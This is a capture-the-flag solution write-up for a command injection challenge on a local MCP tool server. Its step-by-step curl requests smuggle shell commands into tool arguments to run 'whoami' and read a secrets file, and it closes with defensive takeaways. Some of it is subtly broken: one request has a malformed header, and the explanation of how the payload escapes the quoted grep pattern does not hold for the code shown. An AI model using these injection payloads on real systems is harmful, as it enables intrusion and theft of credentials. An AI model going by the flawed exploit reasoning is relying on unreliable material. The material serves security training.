# Level 05: Command Injection - Solution

## Vulnerability Overview

**OWASP MCP Top 10:2025 - MCP05: Command Injection**

This challenge demonstrates OS command injection where user input is passed directly to shell commands without sanitization. The server uses `subprocess.run()` with `shell=True`, allowing attackers to inject arbitrary shell commands through tool parameters.

## Step-by-Step Exploitation

### Step 1: Initialize MCP Session

Connect to the MCP gateway and initialize a session:

```bash
curl -X POST http://localhost:8900/mcp \
  -H "MCP-Protocol-Version: 2025-11-25" \
  -H "Content-Type: application/json" \
  -d '{
    "jsonrpc": "2.0",
    "id": 1,
    "method": "initialize",
    "params": {
      "protocolVersion": "2025-11-25",
      "capabilities": {},
      "clientInfo": {"name": "security-tester", "version": "1.0"}
    }
  }'
```

### Step 2: List Available Tools

Discover which tools are vulnerable to command injection:

```bash
curl -X POST http://localhost:8900/mcp \
  -H "MCP-Protocol-Version: 2025-11-25" \
  -H "Content-Type: application/json" \
  -d '{
    "jsonrpc": "2.0",
    "id": 2,
    "method": "tools/list",
    "params": {}
  }'
```

**Response includes:**
- `convert_image` - Image conversion with ImageMagick
- `compress_files` - File compression with tar/zip
- `search_files` - Text search with grep
- `get_file_info` - File information with file/stat commands

All tools accept user input that gets passed to shell commands.

### Step 3: Test for Command Injection

Try a simple command injection test using the `search_files` tool:

```bash
curl -X POST http://localhost:8900/mcp \
  -H "MCP-Protocol-Version: 2025-11-25" \
  -H "Content-Type: application/json" \
  -d '{
    "jsonrpc": "2.0",
    "id": 3,
    "method": "tools/call",
    "params": {
      "name": "search_files",
      "arguments": {
        "pattern": "test; whoami #",
        "directory": "/tmp"
      }
    }
  }'
```

If successful, you'll see the output of the `whoami` command, confirming command injection.

### Step 4: Locate the Flag

The flag is stored in `/tmp/mcp_workspace/.secrets`. Inject a command to read this file:

**Method 1: Using search_files**

```bash
curl -X POST http://localhost:8900/mcp \
  -H "MCP-Protocol-Version: 2025-11-25" \
  -H "Content-Type: application/json" \
  -d '{
    "jsonrpc": "2.0",
    "id": 4,
    "method": "tools/call",
    "params": {
      "name": "search_files",
      "arguments": {
        "pattern": "FLAG; cat /tmp/mcp_workspace/.secrets #",
        "directory": "/tmp"
      }
    }
  }'
```

**Method 2: Using convert_image**

```bash
curl -X POST http://localhost:8900/mcp \
  -H "MCP-Protocol-Version: 2025-11-25" \
  -H "Content-Type": application/json" \
  -d '{
    "jsonrpc": "2.0",
    "id": 4,
    "method": "tools/call",
    "params": {
      "name": "convert_image",
      "arguments": {
        "input_file": "test.jpg; cat /tmp/mcp_workspace/.secrets",
        "output_format": "png"
      }
    }
  }'
```

**Method 3: Using get_file_info**

```bash
curl -X POST http://localhost:8900/mcp \
  -H "MCP-Protocol-Version: 2025-11-25" \
  -H "Content-Type: application/json" \
  -d '{
    "jsonrpc": "2.0",
    "id": 4,
    "method": "tools/call",
    "params": {
      "name": "get_file_info",
      "arguments": {
        "filename": "test.txt; cat /tmp/mcp_workspace/.secrets"
      }
    }
  }'
```

### Step 5: Extract the Flag

**Response contains:**

```json
{
  "jsonrpc": "2.0",
  "id": 4,
  "result": {
    "content": [{
      "type": "text",
      "text": "Search results:\n# System Secrets\nDATABASE_PASSWORD=super_secret_db_pass_2025\nAPI_TOKEN=sk-live-prod-token-xyz789\nFLAG=ARENA{MCP05_C0mm4nd_1nj3ct10n_PWN3D}\n"
    }]
  }
}
```

**Flag:** `ARENA{MCP05_C0mm4nd_1nj3ct10n_PWN3D}`

## Vulnerability Analysis

### Root Cause

The server executes shell commands with user-controlled input without validation:

```python
# VULNERABLE CODE
command = f"grep {recursive_flag} '{pattern}' {directory} 2>/dev/null"
result = subprocess.run(command, shell=True, capture_output=True, text=True)
```

**Critical flaws:**
1. **shell=True**: Enables full shell interpretation including metacharacters
2. **No input sanitization**: User input inserted directly into command string
3. **String interpolation**: Dangerous f-string construction of shell commands
4. **No allowlist validation**: Accepts any characters in user input

### Injection Techniques

**Command separators:**
- `;` - Run commands sequentially
- `&&` - Run second command if first succeeds
- `||` - Run second command if first fails
- `|` - Pipe first command's output to second

**Command substitution:**
- `` `command` `` - Execute command and substitute output
- `$(command)` - Modern command substitution syntax

**Comment techniques:**
- `#` - Comment out rest of line to avoid syntax errors

### Example Exploitation

Original command:
```bash
grep -r 'pattern' /tmp/mcp_workspace 2>/dev/null
```

Injected pattern: `FLAG; cat /tmp/mcp_workspace/.secrets #`

Resulting executed command:
```bash
grep -r 'FLAG; cat /tmp/mcp_workspace/.secrets #' /tmp/mcp_workspace 2>/dev/null
```

Shell interprets this as:
```bash
grep -r 'FLAG  # Start of grep search
; cat /tmp/mcp_workspace/.secrets  # Injected command
# ' /tmp/mcp_workspace 2>/dev/null  # Commented out
```

## Real-World Impact

Command injection is consistently ranked in OWASP Top 10 and CWE/SANS Top 25.

**Critical Severity:** CVSS 9.8-10.0 (Remote Code Execution)

**Real-World Examples:**

1. **Shellshock (CVE-2014-6271)** - Bash vulnerability affecting millions
2. **Confluence RCE (CVE-2022-26134)** - OGNL injection → RCE
3. **Log4Shell (CVE-2021-44228)** - JNDI injection → RCE
4. **Twilio Authy breach (2024)** - Unauthenticated endpoint RCE

## Exploitation Timeline

1. **00:00 - Discovery**: List tools, identify shell command execution
2. **03:00 - Testing**: Test basic injection with `; whoami`
3. **07:00 - Enumeration**: Discover secrets file location
4. **10:00 - Exploitation**: Inject `cat` command to read flag
5. **12:00 - Extraction**: Parse response for flag value

## Key Takeaways

✅ Never use `shell=True` with user input
✅ Use array-based command execution (`subprocess.run(['cmd', 'arg'])`)
✅ Validate and sanitize all user input
✅ Use allowlists for acceptable input patterns
✅ Avoid shell metacharacters entirely
✅ Apply principle of least privilege to command execution
✅ Use safe alternatives (Python libraries vs shell commands)
